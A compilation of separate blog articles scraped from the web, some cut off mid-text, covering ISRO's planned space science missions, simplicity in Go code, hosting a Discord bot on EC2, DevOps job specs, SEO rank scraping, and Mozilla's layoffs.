<p>The hope for scientists globally with these solar missions is to explain why the Sun’s corona is hotter than its surface by several million degrees. This is a <a rel="noreferrer noopener" href="https://science.nasa.gov/news-articles/the-mystery-of-coronal-heating" target="_blank">major unsolved problem</a> in solar physics.</p>



<h3>Specialized X-ray telescope</h3>



<p>ISRO will be launching another space science mission, called X-ray Polarimetry Satellite (<a href="http://www.unoosa.org/documents/pdf/copuos/2017/copuos2017tech30E.pdf">XPoSat</a>), on a PSLV rocket in 2021. Unlike the Swiss Army knife that is Astrosat, XPoSat will be a smaller, specialized Earth orbiting satellite that will study the polarization of X-rays in space. How radiation is polarized gives away the nature of its source, including the strength and distribution of its magnetic fields and radiation around it.</p>



<p>To this day, the Crab Nebula remains the only X-ray source for which scientists have measured the polarization. XPoSat is expected to provide the same information about the 50 brightest known sources in the universe, including pulsars, X-ray binary stars and gigantic-black-hole-hosting galactic cores.</p>







<p>XPoSat’s <a rel="noreferrer noopener" href="http://rri.res.in/~bpaul/polix.html" target="_blank">polarimeter instrument</a> works in the medium X-ray region, specifically 8–30 keV. It is being built and tested by scientists at the Raman Research Institute.</p>



<h3>A Venus orbiter in the making</h3>



<p>Last year, ISRO <a rel="noreferrer noopener" href="https://www.isro.gov.in/sites/default/files/ao_venus.pdf" target="_blank">called for instrument proposals</a> for a Venus orbiter mission, <a href="https://www.lpi.usra.edu/vexag/meetings/archive/vexag-17/presentations/Nigar.pdf">Shukrayaan</a>, to be launched in 2023. This is great because an initial interest in exploring the planet, in the 1960s and 1970s, quickly faded after Mars started getting all the attention.</p>

<p><a href="https://jatan.space/why-explore-venus/">Venus needs to be explored</a> not just because it hosted water for at least 2 billion years, longer than Mars, but also to understand&nbsp;how Earth-like planets change over time, and what makes Earth a haven for life. Right now, there is only one spacecraft at Venus, the Japanese orbiter <a rel="noreferrer noopener" href="https://global.jaxa.jp/projects/sas/planet_c/" target="_blank">Akatsuki</a>, compared to <a href="https://www.planetary.org/space-images/where-we-are-on-1-june-2020" target="_blank" rel="noreferrer noopener">eight at Mars</a> and <a href="https://www.planetary.org/articles/mars2020">three more on its way</a>. So ISRO sending a mission to Venus should be refreshing for the global planetary science community.</p>



<p>Shukrayaan is expected to have a payload capacity of 100 kg and the spacecraft will be placed in a highly elliptical orbit of 500 ✕ 60,000 km, allowing for both closeup and global observations. In addition to the room for 12 Indian instruments, ISRO will also be adding a few international ones. This is great, as attested by Chandrayaan 1’s <a href="https://jatan.space/how-nasa-and-chandrayaan-discovered-water-on-the-moon/">co-discovery of water on the Moon</a> with NASA.</p>



<p>The primary scientific objectives of Shukrayaan include studies of Venus’ surface and subsurface, its atmospheric chemistry and solar wind interactions with the planet. NASA has <a rel="noreferrer noopener" href="https://news.webindia123.com/news/articles/India/20181130/3483688.html" target="_blank">expressed interest</a> in sending a terahertz instrument onboard the orbiter to see through Venus’s thick atmosphere and observe chemical reactions below.</p>



<hr>



<p>Other missions in ISRO’s pipeline include a follow-up of the Mars Orbiter Mission in 2024. It’ll likely be an orbiter similar to Shukrayaan in terms of payload capacity. There are also plans to follow up on Astrosat and <a href="https://jatan.space/space-digest-chandrayaan-2/">Chandrayaan 2</a> but details are unclear at the moment.</p>



<p>Given ISRO’s fairly nascent space science program, the boost to such missions is a welcome trajectory for India’s space exploration endeavors. Here’s hoping that India goes all in on this trend and makes deep space exploration a prioritized national goal just like it has done to <a href="https://jatan.space/astronauts-begin-training-for-gaganyaan-in-russia/">launch astronauts</a>.</p>

August 15, 2020 | https://qvault.io/2020/08/15/optimize-for-simplicity-first/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/08/15/optimize-for-simplicity-first/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>We can’t optimize for everything in software engineering, so we need to start with something, and that something should be simplicity. For example, to over-optimize for speed in JavaScript, we might write our <a href="https://qvault.io/2019/11/08/benchmarking-array-traversal-in-javascript-going-backwards-is-fastest/">for-loops backwards</a> to the detriment of readability. On other occasions, we may over-optimize architectural abstraction to the detriment of speed.</p>



<p>I assert that we should optimize for simplicity <em>first</em>, and only make complex memory, speed, and abstraction improvements as they become necessary.</p>



<h2>But Muh Speed</h2>



<p>If it’s slow but readable, I can make it fast. If it’s broken but readable, I can make it work. If it’s impossible to understand, then I have to ask around until I can find out what the abomination is <em>supposed</em> to do in the first place.</p>



<p>Working, readable software should be the “MVP” of your code. It’s trivial to find a bottleneck in code that is easy to understand. That one slow chunk of code can be optimized for speed when and if necessary.</p>



<h3>A Small Caveat</h3>



<div><figure><img loading="lazy" width="300" height="169" src="https://qvault.io/wp-content/uploads/2020/08/D42lqfsUcAAS1Du-300x169.jpg" alt="pitfall" srcset="https://qvault.io/wp-content/uploads/2020/08/D42lqfsUcAAS1Du-300x169.jpg 300w, https://qvault.io/wp-content/uploads/2020/08/D42lqfsUcAAS1Du-1024x576.jpg 1024w, https://qvault.io/wp-content/uploads/2020/08/D42lqfsUcAAS1Du-768x432.jpg 768w, https://qvault.io/wp-content/uploads/2020/08/D42lqfsUcAAS1Du.jpg 1200w" sizes="(max-width: 300px) 100vw, 300px" title="D42lqfsUcAAS1Du"></figure></div>



<p>There are cases in which it makes sense to take speed seriously upfront. For example, choosing which language or framework to use for a project is a decision that cannot be undone or changed easily.</p>



<h2>Memory Problems</h2>



<p>Do you need Redis? But do you REALLY need Redis? Probably not. In the case of a web API, omit caching on your first iteration. Most servers don’t require in-memory caching to effectively service users. When speed starts to become a problem, implement in-memory caching on the server itself if possible. In terms of overall system complexity, the only thing worse than code dependencies are external dependencies. </p>



<p>Only add a new database, queuing system, API service, or NPM module if there is no simpler option.</p>



<h2>Abstractions and DRY Code</h2>



<p>There is nothing wrong with writing reusable functions, and most will written functions will be reusable without adding any needless complexity. However, too often I’ve seen developers over-generalize a problem to the detriment of readability. </p>



<p>If there is currently only one place in your application where a function is being called, don’t worry about making that function the most generalized version of itself. For example, let’s say I have some validation middleware in my Go API:</p>



<pre><code lang="go">type apiParams struct {
	OrgID  string
	UserID string
}

func validateParams(params apiParams) error {
	if params.OrgID == "" {
		return errors.New("OrgID is required")
	}
	if params.UserID == "" {
		return errors.New("UserID is required")
	}
	return nil
}</code></pre>



<p>A useful function to be sure, but our naive <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="noopener">DRY</a> filter may kick in an tempt us to do the following:</p>



<pre><code lang="go">type apiParams struct {
	OrgID  string
	UserID string
}

func validateParams(params interface{}) error {
	dat, _ := json.Marshal(params)
	mapParams := map[string]string{}
	json.Unmarshal(dat, &amp;mapParams)

	for k, v := range mapParams {
		if v == "" {
			return fmt.Errorf("%s not found", k)
		}
	}
	return nil
}
</code></pre>



<p>We’ve succeeded in making the code more abstract, now any function can pass in any struct and check if the fields exist! The problem is that we have also added many edge cases that will certainly produce bugs under many conditions. For example, what if an integer is passed in? What if a struct that contains more than just <code>string</code> values is used?</p>



<p>The code was just fine as it was, we had no reason to generalize it. When we finally are forced to generalize it later we will know better <em>how</em> to build a good abstraction.</p>



<p>KISS &gt; DRY. When used properly, DRY code will be more simple than it was before anyhow, these rules aren’t in direct competition.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1596545581685/fFjs7Bakk.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Hey Everyone,</p>
<p>Today I will be sharing on how to host your Discord Bot on AWS (EC2 Instance).
Assuming that you already have a discord bot created (if not, please checkout this amazing article :<a target="_blank" rel="noopener" href="https://medium.com/davao-js/2019-tutorial-creating-your-first-simple-discord-bot-47fc836a170b">Creating your first Discord Bot — Part 1</a></p>
<p>Let's dive into it.</p>
<p>##Creating a server instance.</p>

<p>##Connect to your instance</p>
<ul>
<li><p>Navigate terminal to the directory where you have your “pem” file. First you must make sure your key is not “publicly” viewable. This has to do with file permissions.</p>
<blockquote>
<p>chmod 400 yourkeyfile.pem</p>
</blockquote>
</li>
<li><p>Login using the key with the following command:</p>
<blockquote>
<p>$ ssh -i "yourkeyfile.pem" ubuntu@54.38.245.127</p>
</blockquote>
</li>
<li><p>⚠️Replace “54.38.245.127” with your “public IP” as shown in your EC2 console.</p>
</li>
<li>Your terminal should then show that you have connected.😊</li>
</ul>
<p>##Installing node and running your Bot.</p>
<ul>
<li><p>Install node</p>
<blockquote>
<p>sudo apt-get update
sudo apt-get install nodejs
sudo apt-get install npm</p>
</blockquote>
</li>
<li><p>Upload your node application to the server. You can do this with SFTP software like Cyberduck or WinSCP. The key is selecting “Use Public Key Authentication” rather than enter a password. OR you can clone your repo from Git.</p>
</li>
<li>Install the node package dependencies (specified in your package.json file):<blockquote>
<p>npm install</p>
</blockquote>
</li>
<li>Once your files are uploaded you’ll want to check and make sure your bot works, i.e.<blockquote>
<p>node bot.js</p>
</blockquote>
</li>
<li>The bot will only run while you have terminal open. In order for it to run after you’ve logged out of your EC2 instance and closed your computer, you can either use PM2 or "forever".</li>
</ul>
<p>##Install PM2.</p>
<ul>
<li>PM2 provides an easy way to manage and daemonize applications (run them in the background as a service).</li>
<li>We will use npm, a package manager for Node modules that installs with Node.js, to install PM2 on our server. Use this command to install PM2</li>
</ul>
<blockquote>
<p>sudo npm install -g pm2</p>
</blockquote>
<p>Now, we will use the pm2 start command to run our bot, bot.js, in the background</p>
<blockquote>
<p>pm2 start bot.js
[PM2] Starting /home/ubuntu/discord-greeter-bot/bot.js in fork_mode(1 instance)
[PM2] Done.
┌────┬────────────────────┬──────────┬──────┬───────────┬──────────┬──────────┐
│ id │ name               │ mode     │ ↺    │ status    │ cpu      │ memory   &gt; │
├────┼────────────────────┼──────────┼──────┼───────────┼──────────┼──────────┤
│ 0  │ bot                │ fork     │ 0    │ online    │ 0%       │ 40.4mb   │
│ 1  │ bot                │ fork     │ 0    │ online    │ 0%       │ 24.5mb   │
└────┴────────────────────┴──────────┴──────┴───────────┴──────────┴──────────┘</p>
</blockquote>
<p>⚠️Applications that are running under PM2 will be restarted automatically if the application crashes or is killed, but an additional step needs to be taken to get the application to launch on system startup (boot or reboot). Luckily, PM2 provides an easy way to do this, the startup subcommand.</p>
<p>The startup subcommand generates and configures a startup script to launch PM2 and its managed processes on server boots:</p>
<blockquote>
<p>pm2 startup systemd</p>
</blockquote>
<p>The last line of the resulting output will include a command that you must run with superuser privileges:</p>
<blockquote>
<p>Output
[PM2] Init System found: systemd
[PM2] You have to run this command as root. Execute the following command:
sudo env PATH=$PATH:/usr/bin /usr/lib/node_modules/pm2/bin/pm2 startup systemd -&gt; -u ubuntu --hp /home/ubuntu</p>
</blockquote>
<p>Run the command that was generated (similar to the highlighted output above, but with your username instead of ubuntu) to set PM2 up to start on boot (use the command from your own output):</p>
<blockquote>
<p>sudo env PATH=$PATH:/usr/bin /usr/lib/node_modules/pm2/bin/pm2 startup systemd -&gt; u ubuntu --hp /home/ubuntu</p>
</blockquote>

		<div>
		<p><span><span>Reading Time: </span> <span>8</span> <span>minutes</span></span></p><p>I’m always a little suspicious of job specs looking for the so-called <em>DevOps Engineer</em> role. They often mention a vast variety of duties and responsibilities. </p>



<blockquote><p>Are they hiring for a single role or a whole team?</p></blockquote>



<p>Roles having <em>DevOps</em> in their title hardly share the same meaning. They often have something in common, though. They try to cover for what traditionally would have been the specialization of different professionals.</p>



<p>Don’t get me wrong: cross-functional expertise is definitely important. But I don’t think <em>DevOps</em> means replacing a multitude of specialization with a single role. Different specializations like Operations, Security, Testing, Development, Product Management and so on, are vast and require specific knowledge. </p>



<p>I think the key differentiator of successful <em>DevOps</em> organizations is that they enable effective collaboration. They have as clear <em>North Star</em> the goal to deliver value to the end user.</p>



<p>Overall, I don’t think we should be talking about a <em>DevOps Engineer</em>, but rather about <em>DevOps</em> culture in organizations.</p>



<p>But let’s take a step back first.</p>



<h2>What does DevOps mean, really?</h2>



<p>I tweeted my own definition of DevOps some time ago.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">DevOps is a highly condensed way of referring to the combination of practices that aim at shortening the software development life-cycle, increase the feedback opportunities and facilitate continuous improvement and experimentation.</p>— Alessandro Diaferia (@alediaferia) <a href="https://twitter.com/alediaferia/status/1279460637341560833?ref_src=twsrc%5Etfw">July 4, 2020</a></blockquote>
</div></figure>



<p><em>DevOps</em> organizations incentivise different specialities to collaborate. The intrinsic existing tension between Dev, making changes to the system, and Ops, wanting to keep the system stable, dissolves. The greater good is now <em>the value stream</em>.</p>



<blockquote><p>A stable system that delivers nothing is as useless as an unstable system that keeps offering new functionality.</p></blockquote>



<p>Dev and Ops understand the importance of working together to maximise this flow to figure out which bets worked out and which ones didn’t. </p>



<p>Organizations that embrace the <em>DevOps</em> mindset can be more effective than the competition at experimenting with new functionality. They quickly validate their assumptions, activating and deactivating functionality by flipping a switch on a dashboard.</p>



<p>Incidents become an opportunity for learning rather than a chance of blaming someone.</p>



<p>In general, <em>DevOps </em>organization learn to adapt and evolve to any situation.</p>



<p>Overall, I think there shouldn’t be a single <em>DevOps</em> role but, rather, a set of specific specialities collaborating effectively.</p>



<p>This ideal view of the terminology, though, might sometimes clash with the reality of the job market. Companies willing to attract the best talent with the most current skills may end up advertising for roles that are counterproductive in the context of DevOps principles.</p>



<p>But let’s have a look at a few interesting job specs.</p>



<figure><img src="https://alediaferia.com/wp-content/uploads/2020/07/jordan-whitfield-sm3Ub_IJKQg-unsplash-768x432.jpg" alt="work harder neon sign photo" srcset="https://alediaferia.com/wp-content/uploads/2020/07/jordan-whitfield-sm3Ub_IJKQg-unsplash-768x432.jpg 768w, https://alediaferia.com/wp-content/uploads/2020/07/jordan-whitfield-sm3Ub_IJKQg-unsplash-300x169.jpg 300w, https://alediaferia.com/wp-content/uploads/2020/07/jordan-whitfield-sm3Ub_IJKQg-unsplash-1024x576.jpg 1024w, https://alediaferia.com/wp-content/uploads/2020/07/jordan-whitfield-sm3Ub_IJKQg-unsplash-1536x863.jpg 1536w, https://alediaferia.com/wp-content/uploads/2020/07/jordan-whitfield-sm3Ub_IJKQg-unsplash-2048x1151.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Photo by <a href="https://unsplash.com/@whitfieldjordan?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Jordan Whitfield</a> on <a href="https://unsplash.com/s/photos/job-search?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure>



<h2>What are companies looking for?</h2>



<p>Let’s read through a few excerpts from job specs I found out there in the wild.</p>



<h3>The flexible problem solver</h3>



<blockquote><p>[…] Devops Engineers are IT professionals who collaborate with software developers, system operators and other IT staff members to manage code releases. They cross and merge the barriers that exist between software development, testing and operations teams and keep existing networks in mind as they design, plan and test. Responsible for multitasking and dealing with multiple urgent situations at a time, Devops Engineers must be extremely flexible. […]</p><cite>A job spec on the internet</cite></blockquote>



<p>This is one of those classic examples where the organization believes that the DevOps principles should be delegated to a single team.</p>



<p>The spec mentions the myriad of duties that are responsibility of the <em>Devops Engineers</em> in the company. A <em>Devops Engineer</em> is expected to <em>“multi-task and deal with multiple urgent situations at a time”</em>. Therefore, they <em>“must be extremely flexible”</em>.</p>



<p><em>Multitasking</em> and dealing with multiple urgent situations at a time is, for sure, likely to happen anywhere: I don’t think this should be a peculiarity of a role in an organization. On the contrary, a healthy environment empowers every engineer to handle urgent situations and <a href="https://landing.google.com/sre/sre-book/chapters/postmortem-culture/">learn from them</a>.<mark id="annotation-text-54d7a912-f939-4d9c-8c35-b5876683f83c"></mark></p>



<hr>



<p>Coming across this role, I’d think that the organization is not really trying to adopt DevOps practices. <mark id="annotation-text-9ee4ee73-52fa-44d6-b856-3c9ba17dd0f4"></mark>Instead of encouraging people to collaborate and improve, they’re building a dedicated team to throw issues and urgent situations at.</p>



<p><mark id="annotation-text-d4681dd9-2adf-49b8-b88c-e4c6a256a1e7"></mark> This job spec would be a big red flag for me.</p>



<h3>The productivity booster</h3>



<blockquote><p>A DevOps Engineer combines an understanding of both engineering and coding. A DevOps Engineer works with various departments to create and develop systems within a company. From creating and implementing software systems to analysing data to improve existing ones, a DevOps Engineer increases productivity in the workplace.</p><cite>Another job spec on the internet</cite></blockquote>



<p>In a <em>DevOps</em> organization engineers <em>do</em> work with various departments. But what’s the point then of  having a dedicated <em>DevOps Engineer</em> role? Do the other type of engineers not work with the various departments of the organization? Do non-DevOps Engineers not analyse data and improve existing systems? Additionally, the job spec claims that <em>a DevOps Engineer increases productivity in the workplace</em>. How? Does it radiate productivity?</p>


	
	


<h3>The Release Manager… but <em>DevOps</em>!</h3>



<blockquote><p>A DevOps Engineer works with developers and the IT staff to oversee the code releases. […] Ultimately, you will execute and automate operational processes fast, accurately and securely.</p><cite>My favourite so far</cite></blockquote>



<p>This is quite a condensed one but the release aspect mentioned in it strikes me as particularly interesting.</p>



<p>I tend to separate the concept of <em>deployment</em> from the one of <em>release</em>. Users experience product updates governed by a release policy that may or may not be the same as the deployment policy. This really depends on the strategy of the organization.</p>



<p>Regardless of this distinction, though, I believe that constraining the capability of delivering value to the end user to a specific role undermines the agility of an organization.</p>



<p>The teams should be able to continuously release code into production. Mechanisms such as <em><a href="https://martinfowler.com/articles/feature-toggles.html">feature flags</a></em> should control the release of functionality. This means that the code in production doesn’t necessarily activate upon deploying it, making it possible for the organization to control when the functionality actually reaches the user.</p>



<p>In general, a deployment should be a non-event: nothing special, just another merge into the main branch that causes code to end up in production.</p>



<p>In a fast-paced world like the one we live in an organization shouldn’t constrain itself by requiring dedicated engineers to release new functionality. Modern environments require companies to always be experimenting. Organizations should empower non-technical teams to run experiments, analyse data and autonomously decide when to <em>release</em> new functionality. All of this, ideally, shouldn’t require <em>ad hoc</em> intervention from a specific engineer.</p>



<p>Job specs like this one feel like they’re trying to repurpose the role of the <em>Release Manager</em> to keep up with the latest trends by just changing a few words.</p>



<p>I don’t think release management goes away in a <em>DevOps</em> organization. Rather, the <em>Release Management</em> becomes ensuring that the rest of the organization can be autonomous at releasing. Achieving this means investing in automation and internal tools for the whole company.</p>



<h3>A Platform Engineer. But <em>cooler!</em></h3>



<blockquote><p>The DevOps Engineer will be a key leader in shaping processes and tools that enable cross-functional collaboration and drive CI/CD transformation. The DevOps Engineer will work closely with product owners, developers, and external development teams to build and configure a high performing, scalable, cloud-based platform that can be leveraged by other product teams.</p></blockquote>



<p>This is the <em>least bad</em> of the job specs I’ve encountered. It describes a set of responsibilities that usually pertain to a Platform or Infrastructure Team. Most of these teams often get renamed to DevOps Team and their members become DevOps Engineers for <em>fashion</em> reasons.</p>



<p>The Platform Engineering team is the key enabler for organizations that want to embrace the DevOps principles. But thinking that they only pertain to a specific team will hardly result in a successful journey.</p>



<p>This team will surely be responsible to build the relevant infrastructure that enables the other teams to build on top but they can’t be left alone in the understanding and application of those principles.</p>



<p>Developer teams will need to become autonomous at adopting and making changes to those systems; they will need to understand the implications of their code running in production; understand how to recognize if the system is not behaving as expected and be able to action to restore it.</p>



<p>Equally, the Product team should spend time understanding what new important capabilities derive from adopting DevOps practices. Code continuously flowing into production behind feature flags, containerization technologies, improved monitoring and alerting, <em>et cetera</em>, open endless opportunities.</p>



<p>Improved user experience and experimentation opportunities, for example, are an important asset to leverage to remain competitive.</p>

<h2>What should companies be looking for?</h2>



<p>We’ve just gone through a few job specs that look for variations of a <em>DevOps Engineer</em> role and I’ve outlined what aspects I think are flawed in those roles. But what should companies look for, then?</p>



<p>Before blindly starting to hire for roles driven by industry fashion trends, organizations should rather invest in understanding what’s holding them back from being <em>DevOps</em>.</p>



<p>In the <a href="https://itrevolution.com/the-unicorn-project/">Unicorn Project</a>, <a href="https://twitter.com/RealGeneKim">Gene Kim</a> mentions the <em>Five Ideals</em> of successful DevOps organizations.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Because ranking #1 drives traffic</p><figure><img src="https://cdn-images-1.medium.com/max/800/1*iiAdAA0R3qP2i3lZGqxonQ.jpeg" alt=""></figure><h3 id="track-your-seo-rankings">Track your SEO rankings</h3><p>How high you rank in the search engines is important for your business. Having a high ranking for certain keywords can drive immense traffic to your website without having to buy advertisement. It’s a great way to increase adoption of your product. As a business owner you want to stay up-to-date with your SEO rankings to be at the top results and be the first they click on when searching for that type of product.</p><p>Today we’ll show some pitfalls of SEO and how we can optimize and automate our rankings to get most out of our SEO and get the organic growth flowing in.</p><h3 id="seo-today">SEO Today</h3><p>Nowadays ranking algorithms have adapted a lot and it’s not always straightforward to rank number one. In 2019 for example, Google launched its new BERT algorithm which got a lot of attention as every SEO professional needed to, and probably still has, to learn the tricks on how to optimize for BERT. While before you could go through with optimizing keyword usage, it’s now also about the positioning of these keywords and if the content you serve is relevant.</p><p>Next to this technical scores also play a role, think of mobile optimization, optimal network delivery, UX changes. For example, Google will also look on how much your page moves when visiting (because of cookie banners, wrong image heights, …). Luckily there are tools like Google Search Console, Lighthouse and many more that help us with this.</p><h3 id="google-search-console">Google Search Console</h3><p>The <a href="https://search.google.com/" rel="noopener">Google search console</a> is your new go to address for tracking your SEO changes. It includes a lot of relevant information to get started with getting this high ranking in the first place. A good rule of thumb here (and perhaps most of the time) is, is it red? Then it needs fixing. Everything that is red, being from a page with an error or errors in vitality will impact your ranking thus costing you a lot of potential income.</p><h4 id="setup">Setup</h4><p>At first you’ll have to validate that you own the site, there are several ways to do this. We used the DNS record as it’s easy to remove afterwards and doesn’t require a re-deploy. If you don’t have the technical know-how you can always ask your site admin to do this for you.</p><p>After setting the search console up for the first time it’s ideal to submit your sitemaps, this will help Google identify the pages that need to be crawled and will ensure that your pages get taken up in their crawling database. From then on it’s a waiting game, crawling takes time, try to get it (rather) correct from the first time.</p><h4 id="performance">Performance</h4><p>The search console also has a great Performance dashboard that includes how many impressions and clicks you get for each keyword. It can be that some keywords are included that you might not optimize for, but that’s okay!</p><p>An important metric here is the Clicks VS Impressions ratio. When the impressions are high and the Clicks are low, it can be because of a few reasons:</p><ul><li>Your site is low ranked</li><li>The Title, Description don’t invite to be clicked</li></ul><p>Luckily we’ll learn further on how we can track this.</p><h3 id="search-engines">Search engines</h3><p>There are many search engines out there, however, optimizing for the the top three targets more than 96%! of the total search engine. The top 3 is Google, Bing and Yahoo!. As you might have guessed, Google takes the crown with a massive 91% usage. Which is incredible and makes single targeting Google worthwhile.</p><figure><img src="https://cdn-images-1.medium.com/max/800/1*1iEBdNm_KK9Uie9ykE9Aig.png" alt=""></figure><p>The image shows the total usage of the search engines from June 2020, credits to statscounter.</p><p>Here we clearly see that optimizing <strong>SEO specifically for Google</strong> is very important! Imagine being number 1 for a keyword that 91% of the people who browse the internet use!</p><p>Luckily Google is also the provider with the best toolset to get the SEO optimization done right!</p><h3 id="the-difficulty">The difficulty</h3><h4 id="the-bert-algorithm"><strong>The BERT algorithm</strong></h4><p>It’s new, it’s shiny, and… nobody knows it well… Introduced in 2019, it’s still something that we don’t know how to optimize 100% for. There are some great tutorials out there that tell you more about it.</p><h4 id="identifying-keywords">Identifying keywords</h4><p>You probably want to identify keywords to increase organic growth and get these clicks rolling in. But how do you identify the keyword that will thrive these clicks? There are a lot of better tutorials out there to identify keywords, so i’ll leave it up to them, to name a few:</p><ul><li><a href="https://moz.com/beginners-guide-to-seo" rel="noopener">https://moz.com/beginners-guide-to-seo</a></li><li><a href="https://neilpatel.com/what-is-seo/" rel="noopener">https://neilpatel.com/what-is-seo/</a></li><li><a href="https://ahrefs.com/blog/seo-basics/" rel="noopener">https://ahrefs.com/blog/seo-basics/</a></li></ul><h4 id="staying-up-to-date-with-rankings">Staying up-to-date with rankings</h4><p>Google crawls the web many many times a day and your rankings potentially change daily. This means that for each keyword you won’t always know your ranking and will have to search it every day, over and over again. You could outsource this, but you still need the analysis. So how do you stay up-to-date with what Google or Bing is showing?</p><h3 id="the-solution">The solution</h3><p>This is where <strong>Web Scraping</strong> comes in, it’s a very simple way to check your ranking every hour, day or however frequent you want.</p><p>For example, over at Scraper.AI we want to rank #1 for certain keywords. One of these is “ai scraper”. But it took a while to get there, daily checking all our keywords would just be a pain, so that’s why we automated this process.</p><p>We when to the URL where we monitor our keyword, in Google we ended up with something like this: <a href="https://www.google.com/search?q=ai+scraper" rel="noopener">https://www.google.com/search?q=ai+scraper</a> while the bing alternative is <a href="https://www.bing.com/search?q=ai+scraper" rel="noopener">https://www.bing.com/search?q=ai+scraper</a></p><h4 id="scraping-search-results">Scraping Search results</h4><p>Selecting results could be as easy as in the following screenshot. In this case we launched the Scraper.AI extension, went to “Select element” and hovered over the items we were interested in. In this case we wanted all non-ad URLs, Titles and Descriptions. If you want more than ten results, you can also hit the page selector and click the next page button.</p><figure><img src="https://cdn-images-1.medium.com/max/800/1*CCMhEvPPY5tNGfEgDU8UjA.png" alt=""><figcaption>I’m interested in the Title, URL and Description of the&nbsp;rankings</figcaption></figure><p>Now i can get daily updates of my results, and check how my SEO changes to my webpage are affecting my ranking. For Scraper.AI we take the delta of the ranking after scraping to see this increase.</p><p>We also took the description to see why our competition is potentially doing better. This way we get a better understanding of the competition and might get an insight in which keywords they’re using and score well for.</p><h4 id="scraping-the-google-search-console">Scraping the Google Search Console</h4><p>Next to the results, it’s also very relevant to get the Performance for each keyword. Let’s head over to the Google Search Console, go to the Performance tab and start scraping that list. Some of the most relevant metrics here are:</p><ul><li>The last update time, so we know when these metrics were updated</li><li>The queries, to get our keywords</li><li>The countries, perhaps we need some localization?</li><li>The devices, might want to optimize more for mobile or tablet?</li><li>Dates, optional, in case you want to make a fancy graph yourself. Though we can also just scrape the graph image 😃</li></ul><figure><img src="https://cdn-images-1.medium.com/max/800/0*tFAdtPoaBP95wBpS.png" alt=""><figcaption>An example of a Google Search&nbsp;Console</figcaption></figure><p>This is where most scrapers fall out, scraping pages that require authentication is not always supported and will require you to send cookies. Luckily, over at <a href="https://scraper.ai/" rel="noopener">Scraper.AI</a> we support authenticated page scraping.</p><p>We always recommend to log in as a user that has the least permission needed in order to complete the task. At respective companies like ourselves the data is heavily encrypted and stored away, but having this least permission approach will increase security even more.</p><h4 id="ironing-out-the-errors">Ironing out the errors</h4><p>While we’re in the search console, it’s very helpful to also identify the errors that might arise. For example, our sitemap is rather important. Head over to Sitemaps and scrape the table of submitted sitemaps. This way we can track automatically when something goes wrong and the amount of URLs a sitemap contains.</p><h3 id="summary">Summary</h3><p>A lot has changed in the SEO world, and a lot of manual work is involved in order to get that number one spot and be the king/queen of a specific search result. Only then will you be able to get the most traffic for that keyword. Afterwards it’s up to you to convert that traffic in to paid users!</p><p>In order to track changes to your SEO rankings, a lot of manual tasks and time was needed. Web scraping can decrease the work and time considerably and should be seen as a great technique for your workflow.</p><p>Not only can we track the increase of keyword hits, we can also track the errors and optimize our SEO results</p><hr><p>Hey 👋, My name is Maxim from <a href="https://scraper.ai/" rel="noopener nofollow noopener">https://scraper.ai</a>.

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Mozilla, the company behind the open-source Firefox browser, recently laid off over 250 of its
employees, a move largely slammed, with only few apologists claiming it was necessary and actually
the only right thing to do given the circumstances. I strictly reject this notion, because I believe
that beyond basic quality of life concerns, ideals should always be a higher priority than
money.</p>

<p>I won’t lie and say I was not affected by the Mozillian announcement and lay-offs, full of PR-speak
that somehow tried to spin it into actually a BLM-thing (?). I love the Firefox browser, I use it
daily, and I use it to make a living. I truly believe in the power of maintaining competitors in any
marketplace (a key aspect of capitalism, nonetheless), and I believe Mozilla and the Firefox browser
had the right ideals for me, as a quasi-privatist and semi-securitist, to use and champion to my
peers.</p>

<p>Now we have reached the point I want to discuss, which is the Mozilla Corporation firing 250 of its
“least important” employees, restructuring, and focussing on better payment models to <em>keep the boat
floating</em>. My key point in this essay is that I believe a company like Mozilla <strong>should reduce costs
in the management department before even firing a single engineer</strong>.</p>

<p>I am purposefully glossing over some details that I am sure make this a more difficult problem:</p>

<ul>
  <li>The Mozilla name spans both a foundation and a corporation, and I obviously am not privy to the
money flows within these two divisions, but I will argue that it doesn’t really matter how you
structure it;</li>
  <li>In a more general sense, I admit that payment for FOSS development is a largely unsolved
problem, and I will even admit that the above divisional split is perhaps the first good attempt at
it.</li>
</ul>

<p>If you’ve ever spent more than five minutes in a room with me, you’ll know I am a big fan of
uncorrupted socialist democracy, much like you see in Scandinavian and northern-European countries.
I truly believe, and appoint whatever success I have had in life, to the freedom and carefree living
that (mostly) free healthcare and university allow for. This in turn makes the opposite, a barely-taxed
barren wasteland like the US seem like a veritable hell: everything depends on getting and
having money, including getting and having money. It’s a vicious cycle that puts the vast majority
of the population in a terrible position, because of a vague sense of economical freedom.</p>

<p>I am immediately reminded of free and open-source software, that lives merely because of the ability
for some individuals to work on software that is free for anyone to use and modify, often without
any form of payment for the software or creator. This system only (barely) works through donations
or by a company allowing its employees to work on FOSS during working hours (a different form of
donation), or because the author of such code can live with less money and spend time on FOSS
instead. In a more general sense, it only gets made for roughly two reasons: 1. A problem exist;
and 2. We should work towards solving it <em>for everyone, indiscriminately</em>.
Working towards it includes donating, FOSS-work time, side projects, or in a more systematic sense,
indirect state-funding a software solution, in the form of real money or free healthcare.</p>

<p>I think FOSS can have a future in an economically left-leaning society: it is not hard to draw
parallels between what are currently considered social and cultural tax recipients, such as music
schools and arts centres, and FOSS as part of the arts (well, it is if you think of programming as
<em>only maths</em>, but we know that isn’t the case). It is even quite possible to see FOSS development as
an extension of academia, in certain fields.</p>

<p>The key here is that we are not discussing something that <em>must magically produce money</em>, we are
discussing whether an ideal is worth putting tax-money into. Does the software produced in the open
